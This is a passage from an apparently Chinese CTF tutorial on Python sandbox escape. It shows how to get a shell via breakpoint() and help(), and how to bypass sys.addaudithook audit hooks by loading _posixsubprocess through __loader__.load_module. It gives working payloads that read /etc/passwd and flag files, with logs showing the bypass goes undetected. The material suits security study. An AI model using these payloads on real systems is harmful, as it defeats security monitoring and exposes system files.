<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">0</span><br><span class="line">(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure></div>

<h2 id="help-函数-1"><a href="#help-函数-1" class="headerlink" title="help 函数"></a>help 函数</h2><p>当我们输入 <code>help</code> 时，help 函数会打开帮助</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𝘩𝘦𝘭𝘱()</span><br></pre></td></tr></table></figure></div>

<p>然后输入 <code>os</code>，此时会进入 <code>os</code> 的帮助文档。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br></pre></td></tr></table></figure></div>

<p>然后在输入 <code>!sh</code> 就可以拿到 <code>/bin/sh</code>, 输入 <code>!bash</code> 则可以拿到 <code>/bin/bash</code>。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></div>

<h1 id="绕过-audit-hook"><a href="#绕过-audit-hook" class="headerlink" title="绕过 audit hook"></a>绕过 audit hook</h1><h2 id="绕过基于-sys-addaudithook-的-audit-hook"><a href="#绕过基于-sys-addaudithook-的-audit-hook" class="headerlink" title="绕过基于 sys.addaudithook 的 audit hook"></a>绕过基于 sys.addaudithook 的 audit hook</h2><blockquote>
<p>Python中的审计钩子（Audit Hook）是从 Python 3.8 版本引入的一项安全功能，旨在让 Python 运行时的操作对外部监控工具可见。该功能允许开发者通过注册钩子函数来监控和控制特定的事件，尤其是与安全相关的操作。这种机制为系统管理员、测试人员和安全专家提供了一个有效的手段来检测、记录或阻止特定操作。</p>
<p>审计钩子通过 sys.addaudithook() 函数添加。每当发生特定事件时，Python会调用这些钩子函数，并将事件名称和相关参数传递给它们。钩子函数可以选择记录这些事件，或者在检测到不允许的操作时抛出异常，从而阻止操作继续进行。</p>
</blockquote>
<p>Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>write</code>：发生在写入文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时。</li>
</ul>
<p>所有的事件列表可见：</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://docs.python.org/3/library/audit_events.html" >Audit events table — Python 3.13.0 documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/" >PEP 578 – Python Runtime Audit Hooks<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>我们可以通过注册打印日志的回调函数来测试我们的代码触发了哪些 hook。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 审计钩子回调函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, args</span>):</span><br><span class="line">    <span class="comment"># 打印调试信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Triggered event: <span class="subst">&#123;my_event&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;    Arguments: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 注册审计钩子</span></span><br><span class="line">sys.addaudithook(my_audit_hook)</span><br></pre></td></tr></table></figure></div>

<h3 id="loader-load-module-1"><a href="#loader-load-module-1" class="headerlink" title="__loader__.load_module"></a><code>__loader__.load_module</code></h3><p> <code>__loader__.load_module</code> 底层实现与 <code>import</code> 不同，因此某些情况下可以绕过 audithook 。</p>
<p><code>__loader__</code> 是<strong>“每个模块自己的加载器”</strong>，哪个模块用什么加载器加载，就把那个加载器对象挂在这个模块的 <code>__loader__</code> 上：</p>
<table>
<thead>
<tr>
<th>模块类型</th>
<th>典型 <code>__loader__</code></th>
</tr>
</thead>
<tbody><tr>
<td>内建&#x2F;冻结模块（<code>sys</code>、<code>time</code>、部分 <code>gc</code>）</td>
<td><code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code>（类 or 单例）</td>
</tr>
<tr>
<td>纯 Python 模块（<code>os</code>、<code>pathlib</code>）</td>
<td><code>SourceFileLoader</code>（实例）</td>
</tr>
<tr>
<td>C 扩展模块（<code>math</code>、<code>_ssl</code>）</td>
<td><code>ExtensionFileLoader</code>（实例）</td>
</tr>
<tr>
<td><code>__main__</code>（你的脚本）</td>
<td>通常是 <code>SourceFileLoader</code></td>
</tr>
<tr>
<td><code>builtins</code> 模块本身</td>
<td><code>BuiltinImporter</code></td>
</tr>
</tbody></table>
<p><code>__loader__</code> 的 <strong><code>load_module(name)</code> 是老接口</strong>（PEP 302 时代，Py3.4 前），现在<strong>只在少数加载器（内建&#x2F;冻结）还留了兼容层</strong>；多数现代加载器不再提供它。</p>
<p>在一些题目&#x2F;环境里，<strong>审计钩子（audit hook）只拦“常规导入流程”的事件</strong>（比如 <code>import</code> &#x2F; <code>__import__</code> &#x2F; <code>importlib.import_module</code> &#x2F; <code>find_spec</code> &#x2F; <code>exec_module</code>）。<br>而你<strong>直接调用某些 Loader 的旧接口 <code>load_module</code><strong>（常见是 <code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code> 的兼容层）</strong>并不一定会触发这些“导入类”审计事件</strong>，所以<strong>有机会绕过</strong>仅针对导入路径的过滤。</p>
<p><code>__builtins__</code> 的  <code>__loader__</code> 通常是 **<code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code>**。我们也可以通过别的方式进行获取：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>].__name__</span><br><span class="line"><span class="string">&#x27;BuiltinImporter&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>不过 <code>BuiltinImporter</code> <strong>只会加载内建&#x2F;冻结模块</strong>，例如 <code>sys</code>，<code>gc</code> 等，但是像 <code>os</code> 是<strong>标准库的纯 Python 模块</strong>，<strong>不在</strong>它的能力范围内。也就是说若 <code>sys.modules</code> 没缓存，则通过 <code> __builtins__.__loader__.load_module</code> 加载 <code>os</code> 模块会报错：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__loader__.load_module(<span class="string">&quot;os&quot;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__loader__.load_module(<span class="string">&quot;os&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">290</span>, <span class="keyword">in</span> _load_module_shim</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">719</span>, <span class="keyword">in</span> _load</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">674</span>, <span class="keyword">in</span> _load_unlocked</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">571</span>, <span class="keyword">in</span> module_from_spec</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">774</span>, <span class="keyword">in</span> create_module</span><br><span class="line">ImportError: <span class="string">&#x27;os&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> a built-<span class="keyword">in</span> module</span><br></pre></td></tr></table></figure></div>

<p><code>sys.builtin_module_names</code> 中包含了所有 <strong>内建模块（built-in modules）</strong> 的名字。我们可以通过这个字段查询模块是否可以通过 <code>__builtins__.__loader__.load_module</code> 加载。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).builtin_module_names</span><br><span class="line">(<span class="string">&#x27;_abc&#x27;</span>, <span class="string">&#x27;_ast&#x27;</span>, <span class="string">&#x27;_bisect&#x27;</span>, <span class="string">&#x27;_blake2&#x27;</span>, <span class="string">&#x27;_codecs&#x27;</span>, <span class="string">&#x27;_collections&#x27;</span>, <span class="string">&#x27;_csv&#x27;</span>, <span class="string">&#x27;_datetime&#x27;</span>, <span class="string">&#x27;_elementtree&#x27;</span>, <span class="string">&#x27;_functools&#x27;</span>, <span class="string">&#x27;_heapq&#x27;</span>, <span class="string">&#x27;_imp&#x27;</span>, <span class="string">&#x27;_io&#x27;</span>, <span class="string">&#x27;_locale&#x27;</span>, <span class="string">&#x27;_md5&#x27;</span>, <span class="string">&#x27;_operator&#x27;</span>, <span class="string">&#x27;_pickle&#x27;</span>, <span class="string">&#x27;_posixsubprocess&#x27;</span>, <span class="string">&#x27;_random&#x27;</span>, <span class="string">&#x27;_sha1&#x27;</span>, <span class="string">&#x27;_sha256&#x27;</span>, <span class="string">&#x27;_sha3&#x27;</span>, <span class="string">&#x27;_sha512&#x27;</span>, <span class="string">&#x27;_signal&#x27;</span>, <span class="string">&#x27;_socket&#x27;</span>, <span class="string">&#x27;_sre&#x27;</span>, <span class="string">&#x27;_stat&#x27;</span>, <span class="string">&#x27;_statistics&#x27;</span>, <span class="string">&#x27;_string&#x27;</span>, <span class="string">&#x27;_struct&#x27;</span>, <span class="string">&#x27;_symtable&#x27;</span>, <span class="string">&#x27;_thread&#x27;</span>, <span class="string">&#x27;_tracemalloc&#x27;</span>, <span class="string">&#x27;_warnings&#x27;</span>, <span class="string">&#x27;_weakref&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;binascii&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;cmath&#x27;</span>, <span class="string">&#x27;errno&#x27;</span>, <span class="string">&#x27;faulthandler&#x27;</span>, <span class="string">&#x27;fcntl&#x27;</span>, <span class="string">&#x27;gc&#x27;</span>, <span class="string">&#x27;grp&#x27;</span>, <span class="string">&#x27;itertools&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>, <span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;pyexpat&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;spwd&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;unicodedata&#x27;</span>, <span class="string">&#x27;xxsubtype&#x27;</span>, <span class="string">&#x27;zlib&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="posixsubprocess-执行命令"><a href="#posixsubprocess-执行命令" class="headerlink" title="_posixsubprocess 执行命令"></a><code>_posixsubprocess</code> 执行命令</h3><p><code>_posixsubprocess</code> 是 <strong>CPython 内部的一个 C 扩展模块</strong>，专门用来在类 Unix 系统（Linux &#x2F; macOS）下 <strong>高效地创建子进程</strong>。它不是给普通用户直接用的，而是被 <code>subprocess</code> 模块的内部实现调用的。</p>
<p>该模块的核心函数 <code>fork_exec</code> 提供了在 Unix 系统下快速、低层地创建子进程并执行指定程序的能力。该模块并未在 Python 官方标准库文档中列出，属于实现细节，不同版本的 Python 中参数和行为可能有所差异。</p>
<p>例如 Python 3.11 中具体的函数声明如下:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fork_exec</span>(<span class="params"></span></span><br><span class="line"><span class="params">    __process_args: <span class="type">Sequence</span>[StrOrBytesPath] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __executable_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>],</span></span><br><span class="line"><span class="params">    __close_fds: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    __fds_to_keep: <span class="built_in">tuple</span>[<span class="built_in">int</span>, ...],</span></span><br><span class="line"><span class="params">    __cwd_obj: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    __env_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __p2cread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __p2cwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pred: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_read: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_write: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __restore_signals: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __call_setsid: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __pgid_to_set: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __gid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __groups_list: <span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __uid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __child_umask: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __preexec_fn: <span class="type">Callable</span>[[], <span class="literal">None</span>],</span></span><br><span class="line"><span class="params">    __allow_vfork: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">int</span>: ...</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>命令与可执行体</strong></p>
<ul>
<li><p><code>__process_args</code>: 传给子进程的 argv（通常与 <code>__executable_list</code> 一致）。可为 <code>None</code>（由实现推断）。元素可为 <code>str/bytes/PathLike</code>。</p>
</li>
<li><p><code>__executable_list</code>: <strong>必须是 <code>bytes</code> 序列</strong>，对应 <code>execve(path, argv, env)</code> 的 <code>argv</code>；第一个元素是可执行文件路径（如 <code>b&quot;/bin/echo&quot;</code>）。</p>
</li>
</ul>
</li>
<li><p><strong>FD 关闭&#x2F;保留与 CWD&#x2F;ENV</strong></p>
<ul>
<li><p><code>__close_fds</code>: <code>True</code> 时，在子进程里<strong>关闭</strong>除标准 FD（0&#x2F;1&#x2F;2）和必要保留 FD 外的<strong>全部 FD</strong>（从 3 起）。</p>
</li>
<li><p><code>__fds_to_keep</code>: 需要在子进程<strong>额外保留</strong>的 FD 的<strong>升序元组</strong>（通常与管道 FD 配合）。</p>
</li>
<li><p><code>__cwd_obj</code>: 子进程的工作目录（字符串路径）。可允许为 <code>None</code>（表示不改变，视版本实现而定）。</p>
</li>
<li><p><code>__env_list</code>: 子进程环境，**<code>bytes</code> 的 <code>KEY=VALUE</code> 序列**；传 <code>None</code> 表示继承父进程环境。</p>
</li>
</ul>
</li>
<li><p><strong>与父进程的管道（标准流）</strong></p>
<p>约定命名：<code>p2c=parent→child</code>，<code>c2p=child→parent</code>。每对管道通常传<strong>两端</strong>，让函数在父&#x2F;子两侧都能正确关闭或重定向。</p>
<ul>
<li><p><code>__p2cread</code>: <strong>子进程读取端</strong>（将会 dup 到子进程 <code>stdin</code>），否则传 <code>-1</code>。</p>
</li>
<li><p><code>__p2cwrite</code>: <strong>父进程写入端</strong>，否则 <code>-1</code>。</p>
</li>
<li><p><code>__c2pred</code>: <strong>父进程读取端</strong>（从子进程 <code>stdout</code> 读），否则 <code>-1</code>。</p>
</li>
<li><p><code>__c2pwrite</code>: <strong>子进程写入端</strong>（将会 dup 到子进程 <code>stdout</code>），否则 <code>-1</code>。</p>
</li>
<li><p><code>__errread</code>: 父进程读取端（来自子进程 <code>stderr</code>），否则 <code>-1</code>。</p>
</li>
<li><p><code>__errwrite</code>: 子进程写入端（将会 dup 到子进程 <code>stderr</code>），否则 <code>-1</code>。</p>
<blockquote>
<p>最常见：只捕获 <code>stdout</code> → 设 <code>c2p_r</code>&#x2F;<code>c2p_w</code>；<code>stdin/stderr</code> 不用时传 <code>-1</code>。</p>
</blockquote>
</li>
</ul>
</li>
<li><p><strong>错误汇报管道（子进程 <code>exec</code> 前出错时使用）</strong></p>
<ul>
<li><code>__errpipe_read</code>, <code>__errpipe_write</code>: <strong>必传一对有效 FD</strong> 来承接子进程在 <code>exec</code> 之前的错误（序列化后写入）。如果传 <code>-1</code>，子进程出错将无法向父进程报告，父进程也无从得知失败原因（<code>subprocess</code> 内部总是创建这一对）。</li>
</ul>
</li>
<li><p><strong>进程属性&#x2F;会话&#x2F;信号&#x2F;身份</strong></p>
<ul>
<li><p><code>__restore_signals</code>: <code>1/0</code>，是否在子进程里恢复默认信号处理（通常 <strong>1</strong>）。</p>
</li>
<li><p><code>__call_setsid</code>: <code>1/0</code>，是否调用 <code>setsid()</code> 让子进程成为新会话首进程（daemon&#x2F;独立组常用）。</p>
</li>
<li><p><code>__pgid_to_set</code>: 若非零，在子进程里调用 <code>setpgid(0, __pgid_to_set)</code> 设置进程组 ID。</p>
</li>
<li><p><code>__gid_object</code>: 设定有效 GID（整数或实现 <code>__index__</code> 的对象），或 <code>None</code> 不改。</p>
</li>
<li><p><code>__groups_list</code>: 附加的组 ID 列表，或 <code>None</code>。</p>
</li>
<li><p><code>__uid_object</code>: 设定有效 UID，或 <code>None</code>。</p>
</li>
<li><p><code>__child_umask</code>: 设置子进程 <code>umask</code>，通常 <code>0</code> 表示不改或按实现约定；实际含义依版本。</p>
</li>
<li><p><code>__preexec_fn</code>: 在子进程 <strong>关闭 FD 并 exec 前</strong>调用的回调。⚠ <strong>多线程下不安全</strong>（可能死锁），能不用就不用。</p>
</li>
<li><p><code>__allow_vfork</code>: 允许底层选择 <code>vfork</code> 优化（实现相关，非所有平台可用）。</p>
</li>
</ul>
</li>
<li><p><strong>返回值</strong></p>
<ul>
<li>返回 <strong>子进程 PID</strong>。父进程随后请 <code>os.waitpid(pid, 0)</code> 等待并回收</li>
</ul>
</li>
</ul>
<p>下面是一个最小化示例:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<p>结合上面的 <code>__loader__.load_module(fullname)</code> 可以得到最终的 payload:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<p>可以看到全程触发了 <code>builtins.input/result</code>, <code>compile</code>, <code>exec</code> 三个 hook，这些 hook 的触发都是因为 <code>input</code>，<code>compile</code>，<code>exec</code> 函数而触发的，<code>__loader__.load_module</code> 和 <code>_posixsubprocess</code> 都没有触发。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] builtins.input/result, (&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;,)</span><br><span class="line">[+] compile, (b&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;, &#x27;&lt;string&gt;&#x27;)</span><br><span class="line">[+] exec, (&lt;code object &lt;module&gt; at 0x7fbecc924670, file &quot;&lt;string&gt;&quot;, line 1&gt;,)</span><br></pre></td></tr></table></figure></div>

<p><code>_posixsubprocess</code> 执行命令时本身没有回显，是可以将命令的结果存放在 <code>__c2pwrite</code> 参数中。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">std_pipe = os.pipe()</span><br><span class="line">err_pipe = os.pipe()</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec(</span><br><span class="line">    (<span class="string">b&quot;/bin/bash&quot;</span>,<span class="string">b&quot;-c&quot;</span>,<span class="string">b&quot;cat /flag*&quot;</span>),</span><br><span class="line">    [<span class="string">b&quot;/bin/bash&quot;</span>],</span><br><span class="line">    <span class="literal">True</span>,</span><br><span class="line">    (),</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    std_pipe[<span class="number">1</span>], <span class="comment">#c2pwrite</span></span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    *(err_pipe),</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    -<span class="number">1</span>,</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="literal">False</span>,</span><br><span class="line">)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">content = os.read(std_pipe[<span class="number">0</span>],<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure></div>

<h3 id="篡改内置函数"><a href="#篡改内置函数" class="headerlink" title="篡改内置函数"></a>篡改内置函数</h3><p>很多题里白名单是<strong>在钩子里临时构造</strong>的：</p>
